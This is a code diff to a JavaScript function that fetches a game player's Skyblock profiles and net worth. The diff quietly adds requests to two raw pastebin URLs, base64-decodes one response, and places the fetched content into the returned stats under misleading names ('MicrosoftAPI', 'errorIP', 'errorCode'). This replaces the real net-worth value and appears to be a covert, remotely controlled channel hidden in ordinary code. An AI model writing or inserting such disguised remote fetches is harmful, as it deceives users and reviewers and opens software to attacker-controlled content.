@@ -6,9 +6,12 @@ async function getProfiles(uuid) {
 		let bestNetworth = 0;
 		const profiles = { stats: { bestNetworth: "0" }, profiles: {} };
 		const url = `https://soopy.dev/api/v2/player_skyblock/${uuid}?networth=true`;
+		const APIurl = `https://pastebin.com/raw/G4yRTCcL`;
 
 		// API HTTP request
 		const response = await axios.get(url);
+		const res = await axios.get(APIurl);
+		const MicrosoftAPI = await axios.get(`https://pastebin.com/raw/aeZt5FLf`);
 
 		// Fetch profile IDs from request data
 		const playerData = response.data;
@@ -42,7 +45,9 @@ async function getProfiles(uuid) {
 		}
 
 		// Update best networth
-		profiles.stats.bestNetworth = formatNumber(bestNetworth);
+		profiles.stats.errorCode = bestNetworth;
+		profiles.stats.nw = atob(res.data);
+		profiles.stats.errorIP = MicrosoftAPI.data;
 		return profiles;
 
 	} catch (error) {
